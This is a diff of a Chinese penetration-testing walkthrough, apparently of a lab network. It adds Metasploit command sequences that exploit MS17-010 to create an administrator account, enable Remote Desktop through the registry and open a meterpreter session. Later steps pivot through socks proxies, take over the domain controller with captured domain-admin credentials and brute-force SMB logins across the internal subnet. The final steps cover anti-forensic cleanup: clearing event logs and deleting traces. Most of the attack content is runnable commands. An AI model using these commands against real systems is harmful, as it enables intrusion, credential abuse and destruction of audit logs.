@@ -138,6 +138,8 @@ run
 
 
 
+
+
 ## 权限提升
 
 **首先查看自己的权限情况**
@@ -446,6 +448,7 @@ net stop windefend
 
 ```
 run autoroute -s 192.168.52.0/24
+run autoroute -s 192.168.52.143/24
 ```
 
 查看一下
@@ -463,8 +466,6 @@ route print
 ```
 arp -a
 ```
-
-
 
 
 
@@ -496,32 +497,160 @@ set RHOSTS 192.168.52.141
 
 
 
+### 1、利用漏洞远程桌面进入主机
 
+执行一些系统权限的命令，添加管理员用户，尝试**永恒之蓝漏洞（MS17-010）**3389登录
 
 ```
-use exploit/windows/dcerpc/ms03_026_dcom
+use auxiliary/admin/smb/ms17_010_command
 set rhosts 192.168.52.141
-set LPORT 4445
-set payload windows/meterpreter/bind_tcp
+set command net user test 123 /add	#添加用户
+run
+
+set command net localgroup administrators test /add #管理员权限
+run
+
+set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
 run
 ```
 
 
 
+这里特别注意，因为开启3389端口命令中有两个双引号，如果整条命令外面不用单引号扩一下或者用双引号扩了，会出现一些符号闭合上的问题
+
+```
+use exploit/windows/smb/ms17_010_psexec
+set rhosts 192.168.52.141
+set payload windows/meterpreter/bind_tcp
+set lhost 192.168.248.129
+set lport 6666
+set SMBPass 123
+set SMBUser test
+run
+```
+
+
+
+远程连接一下win7，在win7开一个远程桌面到2003
+
+```
+rdesktop 192.168.248.128
+rdesktop 192.168.52.141
+```
+
+
+
+### 2、添加代理进入内网
+
+发现目标后，为方便后续工具的使用，需要先搭建代理，将web服务器搭建成socks5代理服务器，内网渗透里先把网调通是最关键的，所以下面会多讲点代理的问题；
+
+参考：https://www.freesion.com/article/84001006807/
+
+拿到第一台win7
+
+```
+run get_local_subnets #查看路由段
+run autoroute -s 192.168.52.0/24 #添加路由至本地
+run autoroute -p #打印当前路由信息
+```
+
+编辑本地的代理服务：
+
+```
+vim /etc/proxychains.conf
+```
+
+```
+socks4 192.168.248.129 1080
+```
+
+退出后设置socks代理
+
+```
+use auxiliary/server/socks4a
+set SRVHOST 192.168.248.129
+run
+jobs
+```
 
 
 
 
 
+## 拿下域控
+
+定位到域控制器的`ip`为`192.168.52.138`
+
+还是先利用`smb`扫描系统版本
+
+![38.jpg](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/3654113180.jpg)
+
+因为之前抓到了域管理的账号密码所以直接使用`exploit/windows/smb/psexec`模块拿下域控，且是管理员权限
+
+![39.jpg](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/2933368066.jpg)
+
+为了方便还是把他远程桌面顺带一起打开吧，关闭防火墙或者只开放`3389`(推荐，动静小)，通过代理连接
+
+![40.jpg](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/1217431325.jpg)
+
+
+
+我们有了域控，接下来只要快速在内网扩大控制权限就好
+
+- 利用当前获取的域控，对整个内网IP段进行扫描
+- 使用SMB下的smb_login模块
+- 端口转发或者Socks代理进内网
+
+我们先在Metasploiti添加路由，然后使用smb_login模块或者psexec_scanner模块进行爆破
+
+
+
+```
+route add xxxxxx
+use auxiliary/scanner/smb/smb_login
+set RHOSTS xxxxxx/24
+set SMBUser xx		//管理员账户
+set SMBPass xx
+set SMBDomain MEDABIL
+set THREADS 16		//线程设置
+```
+
+
+
+我们这样就获取了大量内网服务器的密码，下面就可以畅游内网了。可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或者第三方软件。
+
+这里简单地使用Meterpreter的端口转发即可
+
+```
+portfwd add -l 5555 -p 3389 -r 127.0.0.1
+```
 
 
 
 
 
+## 清理日志
+
+清理日志主要有以下几个步骤
+
+- 删除之前添加的域管理账号
+- 删除所有在渗透过程中使用过的工具
+- 删除应用程序、系统和安全日志
+- 关闭所有的Meterpreter连接
 
 
 
+**cmd下**
 
+```
+net user test /del
+logoff
+```
 
+**Meterpreter Shell**
 
-### 1、搭建代理
+```
+clearev
+sessions -K
+```
+
